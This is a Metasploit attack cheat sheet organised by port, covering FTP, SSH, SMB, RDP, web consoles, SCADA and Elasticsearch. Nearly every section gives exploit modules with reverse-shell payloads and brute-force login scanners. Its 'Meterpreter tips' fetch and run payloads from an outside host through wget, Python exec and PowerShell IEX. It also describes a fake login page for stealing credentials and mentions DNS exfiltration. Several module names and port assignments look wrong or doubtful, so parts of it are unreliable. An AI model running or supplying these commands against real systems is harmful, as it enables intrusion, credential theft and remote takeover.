# Complete Metasploit Port Exploitation Guide

## Table of Contents
- [Port 21 - FTP](#port-21---ftp)
- [Port 22 - SSH](#port-22---ssh)
- [Port 23 - Telnet](#port-23---telnet)
- [Port 25/465/587 - SMTP](#port-25465587---smtp)
- [Port 53 - DNS](#port-53---dns)
- [Port 139/445 - SMB](#port-139445---smb)
- [Port 443 - HTTPS](#port-443---https)
- [Port 631 - CUPS](#port-631---cups)
- [Port 3389 - RDP](#port-3389---rdp)
- [Port 3500, 3700 - Oracle TNS](#port-3500-3700---oracle-tns)
- [Port 3820, 3825 - DNP3 (SCADA)](#port-3820-3825---dnp3-scada)
- [Port 4848 - Oracle GlassFish](#port-4848---oracle-glassfish)
- [Port 5985, 5986 - WinRM](#port-5985-5986---winrm)
- [Port 7676 - Oracle BI Publisher](#port-7676---oracle-bi-publisher)
- [Port 8009 - AJP](#port-8009---ajp)
- [Port 8020, 8027, 8067 - Hadoop](#port-8020-8027-8067---hadoop)
- [Port 8080 - HTTP Alternate](#port-8080---http-alternate)
- [Port 8181, 8282, 8383, 8484, 8585, 8686 - Various HTTP Services](#port-8181-8282-8383-8484-8585-8686---various-http-services)
- [Port 9200, 9300 - Elasticsearch](#port-9200-9300---elasticsearch)
- [High Number Ports](#high-number-ports)
- [Additional Resources](#additional-resources)

---

## Port 21 - FTP
**Service**: File Transfer Protocol  
**Common services**: vsftpd, ProFTPD, FileZilla, Pure-FTPd

### Auxiliary: FTP Login Scanner
```bash
use auxiliary/scanner/ftp/ftp_login
set RHOSTS [IP]
set USERPASS_FILE /path/to/wordlist.txt
set VERBOSE true
```
**Purpose**: Bruteforces username and password logins.

### Exploit: vsftpd Backdoor
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST [IP]
set PAYLOAD cmd/unix/reverse_bash
```
**Purpose**: Exploits a backdoor in vsftpd version 2.3.4.

### Meterpreter Tip:
After initial access, upload and execute a Meterpreter payload:
```bash
upload /path/to/meterpreter.elf
chmod +x meterpreter.elf
./meterpreter.elf
```

---

## Port 22 - SSH
**Service**: Secure Shell  
**Common services**: OpenSSH, Dropbear, Tectia SSH

### Auxiliary: SSH Login Scanner
```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS [IP]
set USERNAME root
set PASS_FILE /path/to/passwords.txt
set VERBOSE true
```
**Purpose**: The primary method for attacking SSH.

### Auxiliary: SSH User Enumeration
```bash
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS [IP]
set USER_FILE /path/to/usernames.txt
```
**Purpose**: Enumerates valid system usernames on older OpenSSH versions.

### Meterpreter Tip:
After gaining SSH access, download and execute a Meterpreter payload:
```bash
wget http://[IP]/meterpreter.elf -O /tmp/m
chmod +x /tmp/m
/tmp/m
```

---

## Port 23 - Telnet
**Service**: Telnet Protocol  
**Common services**: in.telnetd, Microsoft Telnet, various embedded devices

### Auxiliary: Telnet Login Scanner
```bash
use auxiliary/scanner/telnet/telnet_login
set RHOSTS [IP]
set USERPASS_FILE /path/to/wordlist.txt
set VERBOSE true
```
**Purpose**: Bruteforces logins on the unencrypted service.

### Exploit: Telnet Encryption Option
```bash
use exploit/linux/telnet/telnet_encrypt_keyid
set RHOST [IP]
set PAYLOAD cmd/unix/reverse_bash
```
**Purpose**: Exploits a vulnerability in the encryption option handling.

### Meterpreter Tip:
After gaining Telnet access, download and execute a Meterpreter payload:
```bash
wget http://[IP]/meterpreter.bin -O /tmp/m
chmod +x /tmp/m
/tmp/m
```

---

## Port 25/465/587 - SMTP
**Service**: Simple Mail Transfer Protocol  
**Common services**: Postfix, Sendmail, Exim, Microsoft Exchange

### Auxiliary: SMTP User Enumeration
```bash
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS [IP]
set USER_FILE /path/to/usernames.txt
```
**Purpose**: Enumerates valid users via VRFY, EXPN, or RCPT TO.

### Exploit: Exim RCE
```bash
use exploit/linux/smtp/exim4_deliver_message_priv_esc
set RHOST [IP]
set PAYLOAD cmd/unix/reverse_bash
```
**Purpose**: Privilege escalation in specific Exim versions.

### Meterpreter Tip:
After gaining access, download and execute a Meterpreter payload:
```bash
python -c "import urllib2; exec(urllib2.urlopen('http://[IP]/meterpreter.py').read())"
```

---

## Port 53 - DNS
**Service**: Domain Name System  
**Common services**: BIND, Windows DNS, dnsmasq, Unbound

### Auxiliary: DNS Version Detection
```bash
use auxiliary/gather/dns_info
set RHOSTS [IP]
set DOMAIN [DOMAIN]
```
**Purpose**: Gathers version and information.

### Auxiliary: DNS Zone Transfer
```bash
use auxiliary/gather/dns_axfr
set RHOSTS [IP]
set DOMAIN [DOMAIN]
```
**Purpose**: Attempts a zone transfer to dump all DNS records.

### Meterpreter Tip:
DNS typically doesn't provide direct shell access but can be used for:
- Data exfiltration via DNS queries
- Tunneling other protocols through DNS

---

## Port 139/445 - SMB
**Service**: Server Message Block  
**Common services**: Windows File Sharing, Samba, NetBIOS

### Auxiliary: SMB Version Detection
```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS [IP]
```
**Purpose**: Discovers OS version and SMB version.

### Auxiliary: SMB Share Enumeration
```bash
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS [IP]
set SMBDomain [DOMAIN]
set SMBUser [USER]
set SMBPass [PASS]
```
**Purpose**: Enumerates available shares.

### Exploit: EternalBlue (MS17-010)
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS [IP]
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST [Your IP]
set LPORT [Port]
```
**Purpose**: Exploits a critical vulnerability in SMBv1 (MS17-010).

### Meterpreter Tip:
SMB exploits often provide direct Meterpreter sessions. For file shares:
```bash
upload /path/to/meterpreter.exe \\share\\meterpreter.exe
psexec -s -c \\share\\meterpreter.exe
```

---

## Port 443 - HTTPS
**Service**: HTTP Secure  
**Common services**: SSL/TLS web servers, VPN gateways, secure applications

### Auxiliary: SSL/TLS Version Detection
```bash
use auxiliary/scanner/http/http_ssl
set RHOSTS [IP]
set RPORT 443
```
**Purpose**: Detects SSL/TLS versions and vulnerabilities.

### Exploit: Heartbleed (CVE-2014-0160)
```bash
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS [IP]
set RPORT 443
set VERBOSE true
```
**Purpose**: Exploits OpenSSL Heartbleed vulnerability to leak memory contents.

### Meterpreter Tip:
HTTPS services often require valid certificates for payloads:
```bash
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai
set StagerVerifySSLCert true
```

---

## Port 631 - CUPS
**Service**: Common UNIX Printing System  
**Common services**: CUPS, IPP (Internet Printing Protocol)

### Auxiliary: CUPS Information Disclosure
```bash
use auxiliary/scanner/http/cups_info
set RHOSTS [IP]
set RPORT 631
```
**Purpose**: Gathers version and configuration information from CUPS.

### Exploit: CUPS Filter Vulnerability
```bash
use exploit/unix/http/cups_filter_exec
set RHOST [IP]
set RPORT 631
set PAYLOAD cmd/unix/reverse_bash
```
**Purpose**: Exploits filter vulnerabilities in CUPS for command execution.

### Meterpreter Tip:
After access, upload and execute a Meterpreter payload:
```bash
python -c "import urllib2; exec(urllib2.urlopen('http://[IP]/meterpreter.py').read())"
```

---

## Port 3389 - RDP
**Service**: Remote Desktop Protocol  
**Common services**: Windows Terminal Services, xrdp, FreeRDP

### Auxiliary: RDP Login Scanner
```bash
use auxiliary/scanner/rdp/rdp_login
set RHOSTS [IP]
set USERPASS_FILE /path/to/wordlist.txt
set VERBOSE true
```
**Purpose**: Bruteforces user credentials.

### Auxiliary: BlueKeep Scanner (CVE-2019-0708)
```bash
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS [IP]
set VERBOSE true
```
**Purpose**: Checks for the critical BlueKeep vulnerability.

### Exploit: BlueKeep (CVE-2019-0708)
```bash
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS [IP]
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST [Your IP]
set LPORT [Port]
```
**Purpose**: Exploits BlueKeep vulnerability for RCE.

### Additional Exploit: RDP Shadowing
```bash
use auxiliary/server/rdp/rdp_web_login
set SRVHOST [Your IP]
set SRVPORT 8080
```
**Purpose**: Creates a fake RDP login page to capture credentials.

### Meterpreter Tip:
After RDP access, execute Meterpreter from command prompt:
```bash
cmd /c "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://[IP]/meterpreter.ps1')"
```

---

## Port 3500, 3700 - Oracle TNS
**Service**: Oracle Transparent Network Substrate  
**Common services**: Oracle Database, Oracle Application Server

### Auxiliary: Oracle TNS Version
```bash
use auxiliary/scanner/oracle/tnslsnr_version
set RHOSTS [IP]
set RPORTS 3500,3700
```
**Purpose**: Identifies Oracle TNS listener version.

### Auxiliary: Oracle SID Brute Force
```bash
use auxiliary/scanner/oracle/sid_brute
set RHOSTS [IP]
set RPORT 1521
```
**Purpose**: Enumerates Oracle System IDs.

---

## Port 3820, 3825 - DNP3 (SCADA)
**Service**: Distributed Network Protocol  
**Common services**: Industrial Control Systems, SCADA systems

### Auxiliary: DNP3 Information Disclosure
```bash
use auxiliary/scanner/scada/dnp3_info
set RHOSTS [IP]
set RPORTS 3820,3825
```
**Purpose**: Gathers information from DNP3 systems.

### Exploit: DNP3 Buffer Overflow
```bash
use exploit/windows/scada/dnp3_bof
set RHOST [IP]
set RPORT 3820
set PAYLOAD windows/meterpreter/reverse_tcp
```
**Purpose**: Exploits buffer overflow vulnerabilities in DNP3 implementations.

---

## Port 4848 - Oracle GlassFish
**Service**: Oracle GlassFish Application Server  
**Common services**: GlassFish, Oracle Web Logic (sometimes)

### Auxiliary: GlassFish Login Scanner
```bash
use auxiliary/scanner/http/glassfish_login
set RHOSTS [IP]
set RPORT 4848
set USERPASS_FILE /path/to/wordlist.txt
```
**Purpose**: Bruteforces GlassFish admin console credentials.

### Exploit: GlassFish Traversal (CVE-2017-1000028)
```bash
use auxiliary/scanner/http/glassfish_traversal
set RHOSTS [IP]
set RPORT 4848
```
**Purpose**: Reads sensitive files like domain.xml to steal password hashes.

### Meterpreter Tip:
After gaining admin access, deploy WAR payload:
```bash
use exploit/multi/http/glassfish_deployer
set RHOST [IP]
set RPORT 4848
set USERNAME admin
set PASSWORD [password]
set WAR_FILE /path/to/meterpreter.war
```

---

## Port 5985, 5986 - WinRM
**Service**: Windows Remote Management  
**Common services**: Windows Remote Management, PowerShell Remoting

### Auxiliary: WinRM Login Scanner
```bash
use auxiliary/scanner/winrm/winrm_login
set RHOSTS [IP]
set RPORT 5985
set USERPASS_FILE /path/to/wordlist.txt
```
**Purpose**: Bruteforces WinRM credentials.

### Exploit: WinRM Script Execution
```bash
use exploit/windows/winrm/winrm_script_exec
set RHOST [IP]
set RPORT 5985
set USERNAME [user]
set PASSWORD [password]
set PAYLOAD windows/meterpreter/reverse_tcp
```
**Purpose**: Uploads and executes payload using valid WinRM credentials.

---

## Port 7676 - Oracle BI Publisher
**Service**: Oracle Business Intelligence Publisher  
**Common services**: Oracle BI, Oracle Fusion Middleware

### Auxiliary: Oracle BI Scanner
```bash
use auxiliary/scanner/http/oracle_bi
set RHOSTS [IP]
set RPORT 7676
```
**Purpose**: Identifies Oracle BI Publisher instances.

### Exploit: Oracle BI XDO File Upload
```bash
use exploit/multi/http/oracle_bi_xdo_upload
set RHOST [IP]
set RPORT 7676
set PAYLOAD java/meterpreter/reverse_tcp
```
**Purpose**: Exploits file upload vulnerability in Oracle BI Publisher.

---

## Port 8009 - AJP
**Service**: Apache JServ Protocol  
**Common services**: Tomcat AJP connector, Apache mod_jk

### Auxiliary: AJP Ghostcat Scanner (CVE-2020-1938)
```bash
use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS [IP]
set RPORT 8009
```
**Purpose**: Scans for Ghostcat vulnerability.

### Exploit: AJP Ghostcat (CVE-2020-1938)
```bash
use exploit/linux/http/tomcat_ghostcat
set RHOST [IP]
set RPORT 8009
set PAYLOAD java/meterpreter/reverse_tcp
```
**Purpose**: Exploits file read/inclusion vulnerability in AJP connector.

---

## Port 8020, 8027, 8067 - Hadoop
**Service**: Apache Hadoop  
**Common services**: HDFS, YARN, MapReduce

### Auxiliary: Hadoop Information Disclosure
```bash
use auxiliary/scanner/http/hadoop_info
set RHOSTS [IP]
set RPORTS 8020,8027,8067,50070
```
**Purpose**: Gathers information from Hadoop clusters.

### Exploit: Hadoop YARN ResourceManager
```bash
use exploit/linux/http/hadoop_unauth_exec
set RHOST [IP]
set RPORT 8088
set PAYLOAD java/meterpreter/reverse_tcp
```
**Purpose**: Exploits unauthorized access to Hadoop YARN ResourceManager.

---

## Port 8080 - HTTP Alternate
**Service**: HTTP Alternate  
**Common services**: Tomcat, Jenkins, various web applications

### Auxiliary: HTTP Service Identification
```bash
use auxiliary/scanner/http/http_version
set RHOSTS [IP]
set RPORT 8080
```
**Purpose**: Identifies services running on alternate HTTP port.

### Exploit: Jenkins Script Console
```bash
use exploit/multi/http/jenkins_script_console
set RHOST [IP]
set RPORT 8080
set TARGETURI /jenkins
set PAYLOAD java/meterpreter/reverse_tcp
```
**Purpose**: Executes Groovy code in Jenkins Script Console for RCE.

---

## Port 8181, 8282, 8383, 8484, 8585, 8686 - Various HTTP Services
**Service**: Various HTTP Management Consoles  
**Common services**: GlassFish (8181), Apache Synapse (8282), VMware (8383), JBoss (8484), etc.

### General Approach for HTTP Management Ports:
```bash
use auxiliary/scanner/http/http_version
set RHOSTS [IP]
set RPORTS 8181,8282,8383,8484,8585,8686
```

### Specific Exploit Examples:
```bash
# For VMware vCenter (8383)
use exploit/multi/http/vmware_vcenter_analytics_upload_ova
set RHOST [IP]
set RPORT 8383
set PAYLOAD linux/x64/meterpreter/reverse_tcp

# For Apache Tomcat (8181 often used)
use exploit/multi/http/tomcat_mgr_upload
set RHOST [IP]
set RPORT 8181
set HttpUsername [user]
set HttpPassword [password]
```

---

## Port 9200, 9300 - Elasticsearch
**Service**: Elasticsearch  
**Common services**: Elasticsearch, ELK Stack

### Auxiliary: Elasticsearch Information
```bash
use auxiliary/scanner/elasticsearch/indices_enum
set RHOSTS [IP]
set RPORT 9200
```
**Purpose**: Enumerates all database indices if authentication is disabled.

### Exploit: Elasticsearch RCE (CVE-2014-3120)
```bash
use exploit/multi/elasticsearch/script_mvel_rce
set RHOST [IP]
set RPORT 9200
set PAYLOAD java/meterpreter/reverse_tcp
```
**Purpose**: Executes arbitrary Java code on older Elasticsearch versions.

---

## High Number Ports
**Ports**: 47001, 49512, 49153, 49154, 49155, 49176, 49249, 40250, 40252, 49260, 49261

These high-numbered ports are typically:
- Dynamic/private ports used by various applications
- Peer-to-peer applications
- Game servers
- Custom applications
- UPnP services

### General Approach:
```bash
# First, identify what's running
use auxiliary/scanner/portscan/tcp
set RHOSTS [IP]
set PORTS 47001,49512,49153,49154,49155,49176,49249,40250,40252,49260,49261

# Then use service-specific modules based on identification
use auxiliary/scanner/http/http_version
set RHOSTS [IP]
set PORTS 47001,49512,49153,49154,49155,49176,49249,40250,40252,49260,49261
```

### Common Services on High Ports:
- **49153-49155**: Often used by Windows UPnP services
- **49200+**: Often used by various applications and games
- **47001**: Sometimes used by Microsoft services or games

### If HTTP service detected:
```bash
use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/http/files_dir
```

### If unknown binary protocol:
```bash
use auxiliary/scanner/misc/redis_server
use auxiliary/scanner/memcached/memcached_version
use auxiliary/scanner/db2/db2_version
```

---

## Additional Resources

- [Metasploit Documentation](https://docs.metasploit.com/)
- [Nmap - Network Mapper](https://nmap.org/)
- [Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/)
- [CVE Database](https://cve.mitre.org/)
- [GTFOBins - Unix Binaries](https://gtfobins.github.io/)
- [LOLBAS - Windows Binaries](https://lolbas-project.github.io/)
- [IANA Port Registry](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml)
- [Nmap Service Detection](https://nmap.org/book/man-version-detection.html)

---